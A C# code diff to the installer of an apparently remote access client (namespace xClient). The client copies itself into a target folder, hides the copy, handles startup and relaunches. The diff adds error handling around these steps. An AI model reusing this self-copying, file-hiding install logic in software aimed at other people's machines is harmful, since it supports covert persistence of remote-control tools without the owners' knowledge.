@@ -17,7 +17,17 @@ namespace xClient.Core.Installation
 
             // create target dir
             if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
-                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
+            {
+                try
+                {
+                    Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
+                }
+                catch (Exception)
+                {
+                    ClientData.Disconnect = true;
+                    return;
+                }
+            }
 
             // delete existing file
             if (File.Exists(ClientData.InstallPath))
@@ -47,7 +57,15 @@ namespace xClient.Core.Installation
             if (isKilled) Thread.Sleep(5000);
 
             //copy client to target dir
-            File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
+            try
+            {
+                File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
+            }
+            catch
+            {
+                ClientData.Disconnect = true;
+                return;
+            }
 
             if (Settings.STARTUP)
             {
@@ -61,7 +79,7 @@ namespace xClient.Core.Installation
                 {
                     File.SetAttributes(ClientData.InstallPath, FileAttributes.Hidden);
                 }
-                catch
+                catch (Exception)
                 {
                 }
             }
@@ -76,7 +94,15 @@ namespace xClient.Core.Installation
                 UseShellExecute = true,
                 FileName = ClientData.InstallPath
             };
-            Process.Start(startInfo);
+            try
+            {
+                Process.Start(startInfo);
+            }
+            catch (Exception)
+            {
+                ClientData.Disconnect = true;
+                return;
+            }
             ClientData.Disconnect = true;
         }
     }
